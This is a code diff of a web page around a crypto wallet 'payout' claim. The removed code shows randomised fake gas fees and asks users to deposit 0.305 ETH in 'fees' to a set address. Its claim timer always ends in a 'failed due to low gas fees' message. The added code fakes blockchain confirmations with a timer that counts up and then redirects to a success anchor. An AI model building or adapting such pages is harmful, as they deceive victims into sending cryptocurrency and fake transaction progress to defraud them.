-            }
+        // ---- Countdown ----
+        function updateCountdown() {
+            const secs = remainingSeconds();
+            document.getElementById('countdown').textContent = formatAsHMS(secs);
+            if (secs === 0) finalize();
         }
 
-        async function loadBasicInfo() {
-            try {
-                document.getElementById('status-text').textContent = 'Checking wallet authorization...';
-                const netId = await web3.eth.net.getId();
-                const netName = getNetworkName(netId);
-                showMessage(`🌐 Connected to ${netName}`, 'info');
+        // ---- Confirmations paced to finish at target time ----
+        let confirmIntervalId = null;
+        function startConfirmationTimer() {
+            const secs = remainingSeconds();
+            const stepsRemaining = Math.max(1, (maxConfirmations - confirmations));
+            // Pace increments to end near target time; minimum 5s between ticks
+            const intervalMs = Math.max(5000, Math.floor((secs * 1000) / stepsRemaining));
 
-                const code = await web3.eth.getCode(CONTRACT_ADDRESS);
-                if (code === '0x') throw new Error(`No contract at ${CONTRACT_ADDRESS} on ${netName}`);
-
-                let payoutTime = null;
-                try {
-                    payoutTime = await contract.methods.payoutTime().call();
-                } catch {
-                    await new Promise(r => setTimeout(r, 1000));
-                    try { payoutTime = await contract.methods.payoutTime().call(); }
-                    catch { payoutTime = null; }
-                }
-
-                document.getElementById('your-wallet').textContent = userAccount.slice(0, 8) + '...';
-                document.getElementById('expected-recipient').textContent = RECIPIENT_ADDRESS.slice(0, 8) + '...';
-
-                const isAuth = userAccount.toLowerCase() === RECIPIENT_ADDRESS.toLowerCase();
-                // show/hide deposit & overview for authorized user
-                if (isAuth) {
-                    document.getElementById('balance-overview').style.display = 'block';
-                    document.getElementById('deposit-btn').style.display = 'block';
-                    document.getElementById('deposit-btn').disabled = false;
+            if (confirmIntervalId) clearInterval(confirmIntervalId);
+            confirmIntervalId = setInterval(() => {
+                if (confirmations < maxConfirmations) {
+                    confirmations++;
+                    document.getElementById('confirmations').textContent = `${confirmations} / ${maxConfirmations}`;
                 } else {
-                    document.getElementById('balance-overview').style.display = 'none';
-                    document.getElementById('deposit-btn').style.display = 'none';
+                    clearInterval(confirmIntervalId);
                 }
-
-                if (payoutTime) {
-                    payoutTimeStamp = +payoutTime;
-                    document.getElementById('payout-time').textContent = new Date(payoutTimeStamp * 1000).toLocaleString();
-                    const now = Math.floor(Date.now() / 1000);
-                    if (now >= payoutTimeStamp) {
-                        document.getElementById('status-text').textContent = 'Payout is ready!';
-                        document.getElementById('status-card').className = 'status-card status-ready';
-                        if (isAuth) {
-                            document.getElementById('payout-btn').style.display = 'block';
-                            document.getElementById('payout-btn').disabled = false;
-                            document.getElementById('available-claim-value').textContent = 'Ready! 🎉';
-                        }
-                    } else {
-                        startCountdown(payoutTimeStamp);
-                    }
-                } else {
-                    document.getElementById('payout-time').textContent = 'Unable to load';
-                    document.getElementById('status-text').textContent = 'Found contract, but no payout time.';
-                }
-
-                document.getElementById('info-grid').style.display = 'grid';
-                if (isAuth) {
-                    showWalletStatus('✅ CORRECT WALLET CONNECTED!', 'correct');
-                    document.getElementById('auth-status').textContent = 'Authorized ✅';
-                    showMessage('🎉 You may claim funds or deposit fees.', 'success');
-                } else {
-                    showWalletStatus('❌ WRONG WALLET CONNECTED', 'wrong');
-                    document.getElementById('auth-status').textContent = 'Not Authorized ❌';
-                    showMessage('🚫 Please connect the recipient wallet.', 'error');
-                }
-            } catch (err) {
-                console.error(err);
-                showMessage(`❌ Error: ${err.message}`, 'error');
-            }
+            }, intervalMs);
         }
 
-        function disconnectWallet() {
-            web3 = contract = userAccount = payoutTimeStamp = null;
-            document.getElementById('connect-btn').style.display = 'block';
-            document.getElementById('disconnect-btn').style.display = 'none';
-            document.getElementById('payout-btn').style.display = 'none';
-            document.getElementById('emergency-btn').style.display = 'none';
-            document.getElementById('deposit-btn').style.display = 'none';
-            document.getElementById('balance-overview').style.display = 'none';
-            document.getElementById('info-grid').style.display = 'none';
-            showMessage('🔌 Wallet disconnected.', 'info');
-            const status = document.getElementById('status-card');
-            status.className = 'status-card status-pending';
-            status.querySelector('.status-text').textContent = 'Click "Connect Wallet" to check wallet authorization';
+        // ---- Completion ----
+        function finalize() {
+            if (confirmIntervalId) clearInterval(confirmIntervalId);
+            // Snap confirmations to max at completion
+            confirmations = maxConfirmations;
+            document.getElementById('confirmations').textContent = `${confirmations} / ${maxConfirmations}`;
+            // Redirect (replace with your success page if needed)
+            window.location.href = '#success';
         }
 
-        function getNetworkName(id) {
-            const nets = { 1: 'Ethereum Mainnet', 11155111: 'Sepolia Testnet', 5: 'Goerli Testnet' };
-            return nets[id] || `Network ${id}`;
-        }
+        // ---- Start timers ----
+        updateCountdown();
+        startConfirmationTimer();
+        setInterval(updateCountdown, 1000);
 
-        function updateGasFees() {
-            const staticMin = 0.24, staticAvg = 0.31, staticMax = 0.45;
-            const fluct = Math.random() * 0.02;
-            const minFee = staticMin + fluct;
-            const avgFee = staticAvg + fluct;
-            const maxFee = staticMax + fluct;
-
-            window.currentMaxFee = maxFee;
-
-            document.getElementById('min-fee').textContent = minFee.toFixed(4) + ' ETH';
-            document.getElementById('avg-fee').textContent = avgFee.toFixed(4) + ' ETH';
-            document.getElementById('max-fee').textContent = maxFee.toFixed(4) + ' ETH';
-
-            const warnEl = document.getElementById('fee-warning');
-            if (fluct > 0.015) {
-                warnEl.innerHTML = `⚠️ Warning: Using minimum fees (${minFee.toFixed(4)} ETH) may lead to failure and delay. Recommended: ${maxFee.toFixed(4)} ETH (maximum).`;
-            } else if (fluct < 0.005) {
-                warnEl.innerHTML = `✅ Low fluctuation! Minimum fees (${minFee.toFixed(4)} ETH) should confirm quickly. Recommended: ${maxFee.toFixed(4)} ETH.`;
-            } else {
-                warnEl.innerHTML = `⚠️ Warning: Using minimum fees (${minFee.toFixed(4)} ETH) may lead to failure and delay. Recommended: ${maxFee.toFixed(4)} ETH (maximum).`;
-            }
-        }
-
-        async function depositFees() {
-            if (!web3 || !userAccount) {
-                showMessage('❌ Please connect your wallet first', 'error');
-                return;
-            }
-
-            const to = DEPOSIT_ADDRESS;
-
-            const value = web3.utils.toWei('0.305', 'ether');
-
-            showMessage(`⏳ Opening wallet to deposit 0.305 ETH...`, 'info');
-
-            // Disable button during transaction
-            document.getElementById('deposit-btn').disabled = true;
-
-            try {
-                // sendTransaction returns a promise that resolves with the tx hash
-                const txHash = await web3.eth.sendTransaction({
-                    from: userAccount,
-                    to: to,
-                    value: value,
-                    gas: 21000,                          // Standard gas limit for ETH transfer
-                    gasPrice: await web3.eth.getGasPrice() // Get current gas price
-                });
-
-                showMessage(`✅ Deposit transaction sent! TX: ${txHash.substring(0, 10)}...`, 'success');
-
-                // Wait for confirmation
-                showMessage(`⏳ Waiting for confirmation...`, 'info');
-                const receipt = await web3.eth.getTransactionReceipt(txHash);
-                if (receipt && receipt.status) {
-                    showMessage(`🎉 Deposit confirmed! 0.305 ETH sent successfully!`, 'success');
-                } else {
-                    showMessage(`❌ Transaction failed or pending...`, 'error');
-                }
-
-            } catch (err) {
-                console.error('Deposit error:', err);
-
-                // Handle specific error types
-                if (err.code === 4001) {
-                    showMessage('❌ Transaction rejected by user', 'error');
-                } else if (err.message.includes('insufficient funds')) {
-                    showMessage('❌ Insufficient ETH balance for deposit + gas fees', 'error');
-                } else if (err.message.includes('gas')) {
-                    showMessage('❌ Gas estimation failed. Please try again.', 'error');
-                } else {
-                    showMessage(`❌ Deposit failed: ${err.message}`, 'error');
-                }
-            } finally {
-                // Re-enable button
-                document.getElementById('deposit-btn').disabled = false;
-            }
-        }
-
-        function executePayout() {
-            const messagesDiv = document.getElementById('messages');
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('payout-btn').disabled = true;
-
-            let timeLeft = 5 * 60;
-            messagesDiv.innerHTML = `
-            <div class="waiting-timer">
-                ⏳ Processing your claim...<br>
-                <div class="timer" id="wait-timer">5:00</div>
-                <small>This may take up to 5 minutes</small>
-            </div>`;
-
-            const timerInt = setInterval(() => {
-                timeLeft--;
-                const m = Math.floor(timeLeft / 60), s = timeLeft % 60;
-                document.getElementById('wait-timer').textContent = `${m}:${s.toString().padStart(2, '0')}`;
-            }, 1000);
-
-            const toHandle = setTimeout(() => {
-                clearInterval(timerInt);
-                document.getElementById('loading').style.display = 'none';
-                messagesDiv.innerHTML = `
-                <div class="big-fail">
-                    ❌ TRANSACTION FAILED ❌<br>
-                    Due to low gas fees<br>
-                    <small>Please try again with higher gas fees</small>
-                </div>`;
-                document.getElementById('payout-btn').disabled = false;
-            }, 5 * 60 * 1000);
-
-            contract.methods.payout().send({ from: userAccount })
-                .on('transactionHash', hash => {
-                    clearInterval(timerInt);
-                    messagesDiv.innerHTML = `<div class="info">⏳ Transaction sent! TX: ${hash.slice(0, 10)}…</div>`;
-                })
-                .on('receipt', receipt => {
-                    clearTimeout(toHandle);
-                    clearInterval(timerInt);
-                    document.getElementById('loading').style.display = 'none';
-                    messagesDiv.innerHTML = `
-                    <div class="big-success">
-                        🎉 SUCCESS! FUNDS CLAIMED! 🎉<br>
-                        💰 TX: ${receipt.transactionHash.slice(0, 10)}…
-                    </div>`;
-                })
-                .on('error', err => {
-                    clearTimeout(toHandle);
-                    clearInterval(timerInt);
-                    document.getElementById('loading').style.display = 'none';
-                    const msg = err.message.includes('gas') ? 'Due to low gas fees' : 'Transaction error – try again!';
-                    messagesDiv.innerHTML = `
-                    <div class="big-fail">
-                        ❌ TRANSACTION FAILED ❌<br>
-                        ${msg}<br>
-                        <small>Please try again with higher gas fees</small>
-                    </div>`;
-                    document.getElementById('payout-btn').disabled = false;
-                });
-        }
-
-        async function emergencyPayout() {
-            // implement if needed
-        }
-
-        function startCountdown(payoutTime) {
-            document.getElementById('countdown-section').style.display = 'block';
-            document.getElementById('status-text').textContent = 'Waiting for payout time...';
-            const intv = setInterval(() => {
-                const now = Math.floor(Date.now() / 1000);
-                let t = payoutTime - now;
-                if (t <= 0) {
-                    clearInterval(intv);
-                    document.getElementById('countdown').textContent = 'Ready! 🎉';
-                    document.getElementById('status-card').className = 'status-card status-ready';
-                    document.getElementById('payout-btn').style.display = 'block';
-                    document.getElementById('payout-btn').disabled = false;
-                } else {
-                    const h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), s = t % 60;
-                    document.getElementById('countdown').textContent =
-                        `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
-                    document.getElementById('available-claim-value').textContent =
-                        document.getElementById('countdown').textContent;
-                }
-            }, 1000);
-        }
-
-        function showMessage(txt, type) {
-            const md = document.getElementById('messages');
-            md.innerHTML = `<div class="message ${type}">${txt}</div>`;
-        }
-
-        function showWalletHelp() {
-            const h = document.getElementById('wallet-help');
-            h.style.display = 'block';
-            document.getElementById('mobile-instructions').style.display =
-                isMobile() ? 'block' : 'none';
-            document.getElementById('desktop-instructions').style.display =
-                isMobile() ? 'none' : 'block';
-        }
-
-        function showWalletStatus(msg, type) {
-            const ex = document.querySelector('.wallet-status');
-            if (ex) ex.remove();
-            const d = document.createElement('div');
-            d.className = `wallet-status wallet-${type}`;
-            d.innerHTML = msg;
-            document.querySelector('.header').after(d);
-        }
-
-        window.addEventListener('load', async () => {
-            if (window.ethereum) {
-                try {
-                    const accts = await window.ethereum.request({ method: 'eth_accounts' });
-                    if (accts.length) connectWallet();
-                } catch { }
-            } else {
-                setTimeout(showWalletHelp, 2000);
-            }
-        });
+        // Ensure we definitely end at target time
+        const toTargetMs = Math.max(0, targetTime.getTime() - Date.now());
+        setTimeout(finalize, toTargetMs);
     </script>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
 </body>
 
 </html>
